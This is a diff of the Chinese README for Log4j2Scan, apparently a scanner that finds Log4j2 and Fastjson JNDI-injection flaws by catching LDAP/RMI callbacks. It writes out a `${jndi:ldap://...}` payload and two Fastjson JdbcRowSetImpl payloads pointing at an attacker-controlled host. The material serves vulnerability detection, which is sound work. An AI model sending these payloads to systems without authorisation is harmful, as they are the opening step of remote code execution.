@@ -17,7 +17,11 @@
 
 ## 使用
 
-发送 `${jndi:ldap://ip:端口/}` payload ，如果目标存在漏洞，该项目就会收到 ldap/rmi 请求，从而快速定位哪些目标存在漏洞，Demo 如下
+使用`${jndi:ldap://ip:端口/}`这样的`Payload`
+
+如果目标存在漏洞，该项目就会收到`ldap/rmi`请求，从而快速定位哪些目标存在漏洞
+
+Demo
 ![](https://github.com/KpLi0rn/Log4j2Scan/blob/main/img/002.png)
 
 根据自己操作系统下载对应的可执行文件：[下载地址](https://github.com/KpLi0rn/Log4j2Scan/releases/tag/v0.0.1)
@@ -32,9 +36,10 @@
 /_____/\____/\__, /  /_/_/ //____/\___/\__,_/_/ /_/
  /____/    /___/
     coded by 天下大木头 & 4ra1n
-[+] [09:34:02] use port 8001
-[+] [09:34:02] start result http server
-[+] [09:34:02] start fake reverse server
+[+] [16:36:26] use port: 8000
+[+] [16:36:26] use http port: 8888
+[+] [16:36:26] start fake reverse server
+[+] [16:36:26] start result http server
 |------------------------------------|
 |--Payload: ldap/rmi://your-ip:port--|
 |------------------------------------|
@@ -43,3 +48,23 @@
 只需要将`Payload`设置为：`ldap://your-ip:port`或`rmi://your-ip:port`
 
 然后访问：`localhost:8888`即可动态查看最新结果
+
+## 拓展
+
+不止用于`Log4j2`框架，也可用于检测存在`JNDI`注入的其他框架
+
+例如`Fastjson`的检测：
+
+```text
+{
+	"@type": "com.sun.rowset.JdbcRowSetImpl",
+	"dataSourceName": "rmi://your-ip:port",
+	"autoCommit": true
+}
+
+{
+	"@type": "com.sun.rowset.JdbcRowSetImpl",
+	"dataSourceName": "ldap://your-ip:port",
+	"autoCommit": true
+}
+```
